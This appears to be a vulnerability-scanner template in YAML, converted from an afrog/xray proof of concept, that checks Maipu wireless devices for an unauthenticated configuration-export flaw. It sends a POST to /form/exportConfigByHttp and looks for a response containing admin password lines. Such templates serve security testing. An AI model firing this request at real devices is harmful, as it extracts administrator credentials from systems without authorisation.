# 来源: afrog（转换自 afrog/xray 表达式 POC）
http:
  - body: |
      Download_config=%E5%AF%BC%E5%87%BA
    matchers:
      - type: status
        status:
          - 200
      - type: word
        part: body
        words:
          - Current configuration
          - user admin privilege 15 password
        condition: and
    method: POST
    path:
      - '{{BaseURL}}/form/exportConfigByHttp'
id: maipu-wuxian-exportconfigbyhttp-disclosure
